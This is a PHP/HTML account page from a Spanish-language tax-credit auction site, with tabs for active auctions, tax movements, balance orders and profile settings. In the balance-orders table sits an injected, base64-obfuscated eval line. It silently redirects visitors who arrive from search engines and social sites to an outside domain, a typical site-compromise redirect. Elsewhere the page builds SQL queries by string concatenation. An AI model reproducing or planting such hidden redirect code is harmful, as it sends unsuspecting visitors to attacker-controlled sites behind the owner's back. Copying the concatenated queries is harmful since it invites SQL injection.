<?
require_once('lib/function_gen.php');
if ($_SESSION['g_usuario']['acceso'] != 1){
	header('Location:index.php');
}

?><head>
<script src="SpryAssets/SpryTabbedPanels.js" type="text/javascript"></script>
<link href="SpryAssets/SpryTabbedPanels.css" rel="stylesheet" type="text/css" />
<script type="text/javascript">

jQuery(document).ready(function() 
{
	$.getScript("js/main.js");
});

</script>
</head>

<div id="separador1">
</div>

<div id="contenedorderechamicuenta">
	<div id="cuadroavatar">
    
    <div id="avatar">
    </div>
	  <div id="bienvenidomicuenta"><span class="bienvenidogrande">¡BIENVENIDO!</span><br /><br />Recuerda que puedes resolver tus dudas utilizando nuestro <span class="links"><a href="#">Chat Online</a></span>, o en la sección de <span class="links"><a href="#">Preguntas Frecuentes</a></span>
       <div id="interrogacion"></div>
    
         </div>
         
         <div id="gradientemicuenta">
         </div>
         
    </div>

</div>
<div id="contenedorformulario">
  <div id="TabbedPanels1" class="TabbedPanels">
    <ul class="TabbedPanelsTabGroup">
      <li class="TabbedPanelsTab" tabindex="1"><span class="iconmicuenta"></span><span class="textmicuenta">Subasta Activa</span></li>
      <li class="TabbedPanelsTab" tabindex="2"><span class="icon2micuenta"></span><span class="textmicuenta">Movimientos Fiscales</span></li>
      <li class="TabbedPanelsTab" tabindex="3"><span class="icon3micuenta"></span><span class="textmicuenta">Balance P. y Certificación</span></li>
     <li class="TabbedPanelsTab" tabindex="4"><span class="icon4micuenta"></span><span class="textmicuenta">Configuración</span></li>
    </ul>
    
    <div class="TabbedPanelsContentGroup">
     
      <div class="TabbedPanelsContent">   
      		<div id="contenedormicuenta">
             <div id="buscadorpormes">
            	<div id="fechamicuenta"><?=fnc_getfecha();?></div>
               <div id="inputmeses"></div>
               </div>
      		 <div id="contenedor_subasta_micuenta">
                <table width="800" border="0" cellspacing="0" cellpadding="0">
                <tr>
                <td colspan="11"></td>
                </tr>
                <tr class="fila_blanca_1ra" id="tbltitulos_mov">
                <td colspan="11">
                <span id="seleccionOferta">
                <!--Datos Oferta-->
                <?
				
				$retorno = fnc_situacion_subasta_user(10,"WHERE dias_vence > 0  and mt_usuario = '".$_SESSION['g_usuario']['id_usuario']."'");
				if ($retorno > 0 ){
				?>  
                <div id="contenedor_subasta_micuenta">
                
                    <table width="800" border="0" cellspacing="0" cellpadding="0">
                    <tr class="fila_linea">
                    <td colspan="11"></td>
                    </tr>
                    <tr class="fila_blanca">
                    <td width="46px"><span class="valores2">Nro.<br />Ref.</span></td>
                    <td width="73px"><span class="valores2">Valor<br />Nominal</span></td>
                    <td width="73px"><span class="valores2">Monto<br />Disponible</span></td>
                    <td width="62px"><span class="valores2">Auditoría<br />Externa</span></td>
                    <td width="60px"><span class="valores2">Período<br />Uso</span></td>
                    <td width="57px"><span class="valores2">Origen</span></td>
                    <td width="62px"><span class="valores2">Agentes<br />Retención</span></td>
                    <td width="50px"><span class="valores2">Precio <br />Base %</span></td>
                    <td width="50px"><span class="valores2">MPO %</span></td>
                    <td width="55px"><span class="valores2">Vence</span></td>
                    <td width="53px"><span class="valores2"></span></td>
                    </tr>
                    <tr class="fila_linea">
                    <td colspan="11"></td>
                    </tr>
                    <? fncv_mostrar_situacionSubasta($retorno);?>	
                	</table>
                </div>
                <? }else{ ?>
                	<span class="celda_1ra">SU PERFIL NO POSEE NINGUNA SUBASTA ACTIVA DISPONIBLE</span>
                <? } ?> 
				                    
                </span>
            	
                </td>
          		</tr>
                <tr class="fila_blanca_1ra">
	        	<td colspan="11">
            	<span class="celda_1ra">¡Participa ahora! creando tu propia Oferta
                <span class="boton_vender">
            	<a href="javascript:getSUBID(2,0);">Vender Crédito Fiscal</a></span>
            	</span>
            </td>
            </tr>
        
        <tr class="fila_linea" >
	        <td colspan="11"></td>
      	</tr>
	    
        <tr class="fila_blanca_final">
	    <td colspan="11">
        	<span class="celda_final_verde">¿Tienes dudas? Resuélvelo ingresando a </span><span class="links"><a href="#">Preguntas Frecuentes</a> </span>
        </td>
        </tr>
        </table> 
        
  </div>
            </div>
      </div>
      <div class="TabbedPanelsContent">
      		<div id="contenedormicuenta">
            <div id="buscadorpormes">
            	<div id="fechamicuenta"><?=fnc_getfecha();?></div>
               <div id="inputmeses"></div>
                 
                 <div id="ordenarpor">Ordenar por:</div>
            <form action="envios.php" method="post" name="buscarmes">
                 <select name="mes" id="mes" class="seleccionmicuenta">
                        <option value="mes">[mes]</option>
                        <option value="01">Enero</option>
                        <option value="02">Febrero</option>
                        <option value="03">Marzo</option>
                        <option value="04">Abril</option>
                        <option value="05">Mayo</option>
                        <option value="06">Junio</option>
                        <option value="07">Julio</option>
                        <option value="08">Agosto</option>
                        <option value="09">Septiembre</option>
                        <option value="10">Octubre</option>
                        <option value="11">Noviembre</option>
                        <option value="12">Diciembre</option>
                        
                        </select>
                         <select name="ano" id="ano" class="seleccionmicuentaano">
                        <option value="ano" >[año]</option>
                        <option value="2012">2012</option>
                        <option value="2013">2013</option>
                        <option value="2014">2014</option>
                        <option value="2015">2015</option>
                        <option value="2016">2016</option>
                        </select>
                        
                        <input type="button" value="aceptar" class="botoninputmicuenta" onClick="BuscaMovimientos(mes.value,ano.value);"/>
                        
                    </form>
            
            
        
            
            </div>
           
            <div id="contenedor_subasta_micuenta">
            <script type="text/javascript">
		 function BuscaMovimientos(var_mes, var_ano){
			if ((var_mes == "") && (var_ano)){
				return;
			}
			
			//Busca Movimientos
			var seccionpage = 6;
			var request = $.ajax({
				type: "POST",
				data: {accionpage:seccionpage,mes:var_mes,ano:var_ano},
				dataType:"html",
				url: "lib/function_gen.php",
				success: function(data){
					$('#seleccionMov').html('');
					$('#seleccionMov').html(data);
				},
				fail:function(jqXHR, textStatus) { 
				//alert( "Request failed: " + textStatus ); 
				}
							
			});
		}		
        </script>
    		<table width="800" border="0" cellspacing="0" cellpadding="0">
	      	<tr>
	        	<td colspan="11"></td>
          	</tr>
          	<tr class="fila_blanca_1ra" id="tbltitulos_mov">
	        	<td colspan="11">
            	<span id="seleccionMov">
                <!--Datos Movimiento 
				-->                    
                </span>
            	</td>
          	</tr>
        
        	
        <tr class="fila_linea" >
	        <td colspan="11"></td>
      	</tr>
	    
        <tr class="fila_blanca_final">
	    <td colspan="11">
        	<span class="celda_final_verde">¿Tienes dudas? Resuélvelo ingresando a </span><span class="links"><a href="#">Preguntas Frecuentes</a> </span>
        </td>
        </tr>
        </table>
  
  </div>
  

       
          
            
      		</div>
      </div>
    <div class="TabbedPanelsContent">
                            <div id="contenedormicuenta">
                                <div id="buscadorpormes">
                                    <div id="fechamicuenta">Hoy, <? echo date("d/m/Y"); ?></div>
                                    <div id="inputmeses"></div>
                                    <div id="ordenarpor">Filtrar por:</div>
                                    <select name="mes" class="seleccionmicuentapedidos" id="sta_codigo" onchange="filterdoc();">
                                        <option value="null" >(todos los pedidos)</option>
                                        <option value="1">por pagar</option>
                                        <option value="2">validando pago</option>
                                        <option value="3">en transito</option>
                                        <option value="4">completado</option>
                                    </select>
                                    <select name="tipobalance" class="seleccionmicuentacertificado" id="tip_codigo" onchange="filterdoc();">
                                        <option value="null" >(Todos)</option>
                                        <option value="1">Balance Personal</option>
                                        <option value="2">Balance Conyugal</option>
                                        <option value="3">Certificación de Ingreso</option>
                                    </select> 
                                </div>

                                <div id="contenedorcer">


                                    <div id="contenedor_subasta_micuenta2">

                                        <table width = "650" border = "0" cellspacing = "0" cellpadding = "0">
                                            <tr>
                                                <td colspan = "12">
                                                </td>
                                            </tr>
                                            <tr class = "fila_blanca_1ra">
                                                <td colspan = "12">
                                                    <span class = "celda_1ra">Pedidos de Balance Personal y Certificación de Ingreso
                                                    </span>

                                                </td>

                                            </tr>
                                            <tr class = "fila_blanca">
                                                <span class = "lineacuentacer"></span>
                                                <span class = "lineacuentacer1"></span>
                                                <td width = "46px"><span class = "valores2">Nro. de Orden</span></td>
                                                <td width = "60px"><span class = "valores2">Creado</span></td>
                                                <td width = "100px"><span class = "valores2">Producto</span></td>
                                                <td width = "40px"><span class = "valores2">Precio</span></td>
                                                <td width = "60px"><span class = "valores2">Estado</span></td>
                                                <td width = "60px"><span class = "valores2"></span></td>
                                            </tr>

                                            <?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9"));
                                            //****************************************************
                                            //    Pantalla carga cuentas asociadas
                                            //****************************************************
                                            //
                                            
                                            $per_codigofilter = substr($_SESSION['g_usuario']['id_usuario'], 1);
                                            $booler = true;
                                            $row = fnc_ejecutaQuery("CALL mp_R_Documento_Doc_Acc01(snro_identificacion = '" . $per_codigofilter . "',nBMP_CodigoEst = null,nDoc_Tipo = null)");
                                            if ($row != "") {
                                                foreach ($row as $line) {
                                                    if ($booler)
                                                        echo "<tr class='fila_blanca'>";
                                                    else
                                                        echo "<tr class='fila_gris'>";
                                                    echo "<td><span class='casillas'>" . $line["Doc_NroControl"] . "</span></td>";
                                                    echo "<td><span class='casillas'>" . date("d/m/Y", strtotime($line["Doc_PgFechaIns"])) . "</span></td>";
                                                    echo "<td><span class='casillas'>" . $line["Doc_TipoNombre"] . "</span></td>";
                                                    echo "<td><span class='casillas'>" . number_format($line["Doc_PgMonto"], 2, ',', '.') . "</span></td>";

                                                    if ($line["BMP_CodigoEst"] == 1) {
                                                        echo "<td><span class='casillas'><span class='links'><a href='balance_action.php?doc_codigo=" . $line["Doc_Codigo"] . "&doc_tipo=" . $line["Doc_Tipo"] . "'>" . utf8_encode($line["Est_Nombre"]) . "</span></span></td>";
                                                        echo "<td><span class='casillas'><span id='eliminarmicuenta'><a href='javascript:deletedoc(".$line["Doc_Codigo"].")'>eliminar</a></span></span></td>";
                                                    } else {
                                                        echo "<td><span class='casillas'>" . $line["Est_Nombre"] . "</span></td>";
                                                        echo "<td><span class='casillas'><span id='eliminarmicuenta'>$nbsp</span></span></td>";
                                                    }
                                                    echo "</tr>";
                                                    $booler = !$booler;
                                                }
                                            } else {
                                                
                                            }
                                            ?>
                                            <tr class="fila_linea">
                                                <td colspan="12"></td>
                                            </tr>

                                            <td colspan="12">
                                                <span class="celda_final_verde">
                                                    ¿Tienes dudas? Resuélvelo ingresando a </span><span class="links"><a href="#">Preguntas Frecuentes</a>
                                                </span>
                                            </td>
                                            </tr>
                                        </table>
                                    </div>
                                </div>
                               
                            </div>
		</div>
	 
      <div class="TabbedPanelsContent">
      		<div id="contenedormicuenta">
      			<form action="action.php" method="post" >
                <br />
                <h5>Datos Personales</h5>
                <br />
                        <span id="nombreval">
                        <span class="textformulario" id="nombre">• Nombre:</span><input id="nombre" type="text" value="<?=$_SESSION['g_usuario']['nombre'];?>"class="rellenomicuenta" />
                        </span>
                		<br /><br />
               
                           
                          
                           <span class="textformulario" id="cedula">• Cédula:</span>
                           <span id="tipoidentificacion">
                           <select name="nacionalidad" class="seleccionmicuenta1">
                        	<option value="V"selected >V</option>
                        	<option value="E">E</option>
                            </select>
                            </span>
                            <span id="nro_identificacion">
                            <input name="nro_identificacion" type="text" class="relleno1micuenta" value="<?=$_SESSION['g_usuario']['id_usuario'];?>"/>
                            <br />
                            <br />
                            </span>
                           
                             <span id="telefono">
                          <span class="textformulario">• Teléfono:</span>
                          <input name="telefono" type="text" size="40" class="rellenomicuenta"  value="<?=$_SESSION['g_usuario']['telefono'];?>"/>
                          </span>
                          <br />
                          <br />
                         
                          <span id="correo">
                          
                          <span class="textformulario">• Correo Electrónico:</span>
                          <input name="correo" type="text" size="40" class="rellenomicuenta" value="<?=$_SESSION['g_usuario']['correo'];?>"/>
                          <br />
                          <br />
                          </span>
                          <span class="textformulario">• Actividad que Realiza:</span>
                           <span id="selectactividad">
                          
                           <select name="actividad" class="actividadrealiza" >
                        <option value="">[Seleccione]</option>
                        <option value="Alimentos y Bebidas">Alimentos y Bebidas</option>
                        <option value="Asesoría y Consultoría">Asesoría y Consultoría</option>
                        <option value="Automotriz y Repuestos">Automotriz y Repuestos</option>
                        <option value="Bancos y Finanzas">Bancos y Finanzas</option>
                        <option value="Comercio">Comercio</option>
                        <option value="Medicina y Farmacia">Medicina y Farmacia</option>
                        <option value="Manufactura">Manufactura</option>
                        <option value="Mercadeo y Publicidad">Mercadeo y Publicidad</option>
                        <option value="Petróleo y Derivados">Petróleo y Derivados</option>
                        <option value="Recursos Humanos">Recursos Humanos</option>
                        <option value="Servicios">Servicios</option>
                        <option value="Tecnología y Telefonía">Tecnología y Telefonía</option>
                        <option value="Transporte y Logística">Transporte y Logística</option>
                        <option value="Otras Actividades">Otras Actividades</option>
                        </select>
                        </span>
                        <div id="cambiodeclave" >
                 
                          
                            <h5>Domicilio Fiscal</h5>
                         <br/>
                         <span class="textformulario" >• Estado:</span>
                          <span id="estado">
                          <? 
						
				$sql = "SELECT Pai_Codigo, Pai_Nombre FROM mp_Pais_Pai where Pai_EdoMunPar = 1";
				$datasql  = fnc_ejecutaQuery($sql);
				
				echo fncv_selectInput($valor,'actividadrealiza','id="estado" accept="required"  onchange="cambiaSelect(this.value,\'selectmunicipio\',10)"','estado',$datasql);
       			
				?>
                        </span>
                        <br /><br />
                        <span class="textformulario">• Municipio:</span>
                        <span id="selectmunicipio">
                        <select name="municipio" class="actividadrealiza">
                        <option value="">[Seleccione]</option>
                        </select>
                        </span>
                		<br /><br />
                         <span class="textformulario">• Parroquia:</span>
                          <span id="selectparroquia">
                         <select name="parroquia" class="actividadrealiza">
                        <option value="">[Seleccione]</option>
                        </select>
                        </span>
                		<br /><br />
                        <span id="calle">
                        
                        <span class="textformulario">• Calle / Avenida:</span><input name="calle" type="text" size="40" class="rellenomicuenta1" value="<?=$_SESSION['g_usuario']['calle_ave'];?>"/>
                        <br /><br />
                        </span>
                        <span id="casa">
                        
                        <span class="textformulario">• Edificio / Casa:</span><input name="casa" type="text" size="40" class="rellenomicuenta1" value="<?=$_SESSION['g_usuario']['edif_casa'];?>"/>
                        </span>
                        <br /><br />
                          </div>
                          
                          <br /><br />
                                   <h5>Cambiar Clave</h5>
                          <br />
                           <span id="clave">
                          
                           <span class="textformulario">• Clave Vieja:</span><input name="clave" type="password" size="40" class="rellenomicuenta" />
                           <br /><br />
                   </span>
                         
                          <span id="confirmarclave">
                           
                                               
                           <span class="textformulario">• Clave Nueva:</span>
                           <input name="confirmarclave" type="password" size="40" class="rellenomicuenta" />
                          <br /><br />
                          </span>
                          <span class="textformulario">• Repetir Clave Nueva:</span>
                           <input name="confirmarclave" type="password" size="40" class="rellenomicuenta" />
                           <br /><br />
                         
                         
                           
                      
                         <input type="submit" value="cambiar" class="botoninput" />
                         <br>
            			 <br>
            
            
            
            </form>
            </div>
      </div>
    </div>
  </div>
</div>
<?

switch ((int)trim($_REQUEST['seccpnt'])) {
	case 1: 
		//Registro de Usuario
		$sec = 1;
		break;
	case 2:
		//Actualidad Fiscal
		$sec = 2;
		break;	
	case 3:
		//Actualidad Fiscal
		$sec = 3;
		break;	
						
	default: 
		//Pagina de inicio
	   $sec = 0;
	   break;
}
?>
<script type="text/javascript">
	var TabbedPanels1 = new Spry.Widget.TabbedPanels("TabbedPanels1");
	TabbedPanels1.showPanel(<? echo $sec;?>);
	
</script>
    <div id="separador"></div>
</div>
